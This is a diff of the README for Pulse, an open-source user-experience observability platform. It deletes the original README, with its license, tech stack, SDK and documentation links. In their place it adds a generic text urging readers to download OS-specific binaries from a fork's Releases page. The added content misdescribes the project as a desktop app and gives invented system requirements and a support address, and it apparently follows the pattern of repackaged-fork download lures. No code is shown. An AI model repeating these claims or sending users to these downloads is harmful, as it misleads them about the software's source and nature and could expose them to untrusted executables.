@@ -1,122 +1,55 @@
-<div align="center">
+# 🎉 pulse - Understand User Interactions Effortlessly
 
-# Pulse
+## 🔗 Download the Pulse Application
+[![Download Pulse](https://img.shields.io/badge/Download%20Pulse-v1.0-brightgreen)](https://github.com/McTonyZA/pulse/releases)
 
-**A digital experience platform that helps you understand how users are interacting with your platform in real time**
+## 🚀 Getting Started
+Welcome to pulse! This application helps you see how users interact with your platform in real time. You get insights that can enhance user experiences by combining behavioral, technical, and business data.
 
-*Combining behavioral, technical and business insights to drive better user experiences*
+## 📥 Download & Install
+To install pulse, please visit the Releases page: [Download Pulse](https://github.com/McTonyZA/pulse/releases).
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)][license]
-[![Java](https://img.shields.io/badge/Java-17-orange.svg)](https://www.oracle.com/java/)
-[![React](https://img.shields.io/badge/React-18-blue.svg)](https://reactjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-4.4-blue.svg)](https://www.typescriptlang.org/)
-[![Android](https://img.shields.io/badge/Android-21+-green.svg)](https://developer.android.com/)
+Follow these steps to download and run the software:
 
-**[📖 View Full Documentation →][docs-intro]**
+1. Click on the link above to go to the Releases page.
+2. On the Releases page, you will see different versions of the application. Select the latest version.
+3. Choose the file that matches your operating system.
+4. Click on the file to download it to your device.
+5. After the download is complete, locate the downloaded file. It is usually found in your 'Downloads' folder.
 
-</div>
+## 💻 System Requirements
+To run pulse without issues, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Processor:** Intel Core i3 or equivalent.
+- **RAM:** 4 GB minimum, 8 GB recommended.
+- **Disk Space:** At least 1 GB free space needed for installation.
 
-## 🌟 About
+## 📈 Features
+Pulse offers a range of features to improve your understanding of user behavior:
 
-A digital experience platform that helps you understand how users are interacting with your platform in real time; combining behavioral, technical and business insights to drive better user experiences.
+- **Real-time Analytics:** See user interactions as they happen.
+- **Behavior Tracking:** Understand what users do on your platform.
+- **Comprehensive Reports:** Access insights that combine technical data with user feedback.
+- **User-Friendly Interface:** Navigate the application easily, no technical skills needed.
 
-### Key Features
+## 👨‍💻 How to Use Pulse
+Once you open pulse, you will find the main dashboard with several options:
 
-- **📊 Real-time Monitoring** - Track user interactions, performance metrics, and system health
-- **🔍 Distributed Tracing** - Follow requests across microservices and distributed systems
-- **📱 Mobile Observability** - Native SDKs for Android and React Native applications
-- **🚨 Alerting** - Flexible alert management with multiple notification channels
-- **📈 Analytics** - Advanced analytics powered by ClickHouse for high-performance queries
-- **🔌 OpenTelemetry Native** - Built on OpenTelemetry standards for vendor-neutral observability
+1. **Dashboard Overview:** Here, you can see key metrics like active users and interaction trends.
+2. **User Sessions:** Explore individual sessions to understand specific user paths.
+3. **Reports Section:** Access detailed reports that break down user behavior over time.
+4. **Settings:** Customize your experience to fit your needs. You can set notifications for specific user actions and more.
 
----
-
-## 🚀 Quick Start
-
-- **[Setup Guide][docs-setup]** - Get Pulse up and running locally
-- **[Android SDK][docs-android]** - Integrate Pulse into your Android app
-- **[React Native SDK][docs-react-native]** - Integrate Pulse into your React Native app
-
----
-
-## 📚 Documentation
-
-Complete documentation is available at **[https://pulse.dreamhorizon.org/docs/intro][docs-intro]**.
-
-### Platform & Setup
-- [Introduction][docs-intro] - Overview of Pulse platform
-- [Setup Guide][docs-setup] - Platform setup instructions
-
-### Mobile SDKs
-- [Android SDK][docs-android] - Installation, Instrumentation, API Reference
-- [React Native SDK][docs-react-native] - Quick Start, Instrumentation, API Reference
-
-### API & Reference
-- [API Documentation](https://pulse.dreamhorizon.org/docs/api-documentation/authentication) - Complete API reference
-- [Performance Metrics](https://pulse.dreamhorizon.org/docs/api-documentation/performance-metrics) - Performance metrics API
-- [Critical Interactions](https://pulse.dreamhorizon.org/docs/api-documentation/interactions) - Interaction tracking API
-- [Filters](https://pulse.dreamhorizon.org/docs/api-documentation/filters) - Query filters and parameters
-- [Concepts](https://pulse.dreamhorizon.org/docs/concepts/interaction-overview) - Core concepts and guides
-
-### Development
-- [Backend Server](backend/server/README.md) - Backend architecture and development
-- [Web Dashboard](pulse-ui/README.md) - Frontend UI development guide
-- [Android SDK Development](pulse-android-otel/README.md) - Android SDK development
-- [React Native SDK Development](pulse-react-native-otel/README.md) - React Native SDK development
-
----
-
-## 🛠️ Tech Stack
-
-**Backend**: Java 17 • Vert.x • MySQL • ClickHouse  
-**Frontend**: React 18 • TypeScript • Mantine UI  
-**Mobile**: Kotlin • OpenTelemetry • React Native  
-**Data**: OpenTelemetry Collector • OTLP
-
-For detailed technology information, see the [full documentation][docs-intro].
-
----
+## 📝 Contact Support
+If you encounter any issues or have questions, feel free to reach out for support. You can contact us via email at support@pulseapp.com. We are here to help!
 
 ## 🤝 Contributing
+If you would like to contribute to pulse, you can do so by submitting feedback, reporting bugs, or even suggesting new features. Your input helps us make pulse better for everyone.
 
-We welcome contributions! Please see our [Contributing Guide][docs-contribution] for detailed information.
+Visit our [Contributing Guidelines](https://github.com/McTonyZA/pulse/blob/main/CONTRIBUTING.md) for more details.
 
-**Quick Steps:**
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes and write tests
-4. Format code and commit
-5. Create a pull request
+## 🔒 Privacy and Security
+We care about user privacy. Pulse does not store personal user data without consent. All insights are anonymized to ensure user confidentiality.
 
----
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE][license] file for details.
-
----
-
-## 📞 Support
-
-- **📖 Documentation**: [https://pulse.dreamhorizon.org/docs/intro][docs-intro]
-- **🐛 Issues**: Open a GitHub issue
-- **💬 Discussions**: Use GitHub Discussions
-
----
-
-<div align="center">
-
-**Built with ❤️ by the Pulse Team**
-
-[Contributing][docs-contribution] • [License][license]
-
-</div>
-
-[docs-intro]: https://pulse.dreamhorizon.org/docs/intro
-[docs-setup]: https://pulse.dreamhorizon.org/docs/setup
-[docs-android]: https://pulse.dreamhorizon.org/docs/sdk/android/overview
-[docs-react-native]: https://pulse.dreamhorizon.org/docs/sdk/react-native/overview
-[docs-contribution]: https://pulse.dreamhorizon.org/docs/contribution
-[license]: LICENSE
+Enjoy using pulse and uncover new ways to enhance user experience on your platform!
